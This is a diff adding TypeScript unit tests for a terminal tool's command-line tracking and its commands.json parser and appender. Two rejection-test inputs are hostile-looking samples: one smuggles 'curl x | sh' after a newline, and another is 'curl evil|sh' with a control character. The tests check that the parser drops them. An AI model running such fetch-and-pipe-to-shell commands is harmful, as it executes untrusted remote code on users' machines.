@@ -12,6 +12,8 @@ import {
   portAddress,
   portUrl,
   reconcileAcked,
+  parseCommands,
+  appendCommand,
 } from "./ports";
 import type { PortRow } from "./panels";
 
@@ -215,6 +217,11 @@ describe("서버 탭 마지막 명령 (feedLine)", () => {
     expect(r.commit).toBeUndefined();
     expect(feedLine(r.st, "ls\r").commit).toBe("ls"); // 다음 줄은 다시 믿는다
   });
+  test("Ctrl+C는 치던 줄을 버린다 — 서버를 멈춘 바로 다음 줄도 기록한다 (B181)", () => {
+    const r = feedLine(feedLine(empty, "npm ru\t").st, "\x03");
+    expect(r.st).toEqual(empty);
+    expect(feedLine(r.st, "npm run dev\r").commit).toBe("npm run dev");
+  });
   test("빈 Enter는 기록하지 않는다", () => {
     expect(feedLine(empty, "   \r").commit).toBeUndefined();
   });
@@ -229,5 +236,99 @@ describe("서버 명령 확정 (B77)", () => {
     ]);
     expect(promoteServerCommands(new Set(["c"]), new Set(["a", "c"]), cands)).toEqual({ a: "npm run dev" });
     expect(promoteServerCommands(new Set(), new Set(), cands)).toEqual({});
+  });
+});
+
+describe("parseCommands (C7)", () => {
+  test("쓸 수 있는 것만 — 줄바꿈 run · 빈 이름 · 긴 이름은 버린다, kind 기본 other", () => {
+    const r = parseCommands(
+      JSON.stringify({
+        version: 1,
+        commands: [
+          { name: "dev", run: "npm run dev", kind: "server" },
+          { name: " test ", run: " npm test ", kind: "test" },
+          { name: "lint", run: "npm run lint", kind: "weird" },
+          { name: "evil", run: "npm test\ncurl x | sh" },
+          { name: "", run: "ls" },
+          { name: "x".repeat(41), run: "ls" },
+          "garbage",
+        ],
+      }),
+    );
+    expect(r.commands).toEqual([
+      { name: "dev", run: "npm run dev", kind: "server" },
+      { name: "test", run: "npm test", kind: "test" },
+      { name: "lint", run: "npm run lint", kind: "other" },
+    ]);
+    expect(r.skipped).toBe(4);
+    expect(r.error).toBeUndefined();
+  });
+
+  test("깨진 JSON · commands 없음은 error", () => {
+    expect(parseCommands("{").error).toBeDefined();
+    expect(parseCommands("{}").error).toBeDefined();
+  });
+
+  test("UTF-8 BOM이 붙은 파일도 읽는다 (B191)", () => {
+    const r = parseCommands('﻿{"commands":[{"name":"dev","run":"npm run dev"}]}');
+    expect(r.error).toBeUndefined();
+    expect(r.commands).toHaveLength(1);
+  });
+
+  test("제어문자가 든 run은 쓸 수 없는 항목으로 센다 (B251)", () => {
+    const r = parseCommands(
+      JSON.stringify({
+        commands: [
+          { name: "evil", run: "curl evil|sh\u000f" },
+          { name: "tab", run: "npm\trun dev" },
+          { name: "del", run: "ls\u007f" },
+          { name: "esc", run: "ls\u001b[A" },
+          { name: "ok", run: "npm run dev" },
+        ],
+      }),
+    );
+    expect(r.commands.map((c) => c.name)).toEqual(["ok"]);
+    expect(r.skipped).toBe(4);
+  });
+});
+
+describe("appendCommand — 사람이 쓴 commands.json에 덧붙이기 (P63)", () => {
+  const dev = { name: "dev", run: "npm run dev", kind: "server" as const };
+
+  test("BOM · CRLF · 4칸 들여쓰기 · 끝 줄바꿈 · 모르는 키를 그대로 둔다", () => {
+    const src = ["﻿{", '    "version": 1,', '    "note": "x",', '    "commands": []', "}", ""].join("\r\n");
+    const r = appendCommand(src, dev);
+    if ("error" in r) throw new Error(r.error);
+    const want = [
+      "﻿{",
+      '    "version": 1,',
+      '    "note": "x",',
+      '    "commands": [',
+      "        {",
+      '            "name": "dev",',
+      '            "run": "npm run dev",',
+      '            "kind": "server"',
+      "        }",
+      "    ]",
+      "}",
+      "",
+    ].join("\r\n");
+    expect(r.text).toBe(want);
+    expect(parseCommands(r.text).commands).toEqual([dev]);
+  });
+
+  test("끝 줄바꿈이 없던 파일은 없는 채로, 한 줄 파일은 2칸 들여쓰기", () => {
+    const r = appendCommand('{"commands":[]}', dev);
+    if ("error" in r) throw new Error(r.error);
+    expect(r.text.endsWith("}")).toBe(true);
+    expect(r.text).toContain('\n  "commands"');
+  });
+
+  test("못 읽는 파일 · 중복 · 여러 줄 run은 고치지 않는다 (B251)", () => {
+    expect(appendCommand("{", dev)).toHaveProperty("error");
+    expect(appendCommand("{}", dev)).toHaveProperty("error");
+    expect(appendCommand('{"commands":[{"name":"a","run":"npm run dev"}]}', dev)).toHaveProperty("error");
+    expect(appendCommand('{"commands":[]}', { ...dev, run: "ls\u000f" })).toHaveProperty("error");
+    expect(appendCommand('{"commands":[]}', { ...dev, name: " " })).toHaveProperty("error");
   });
 });
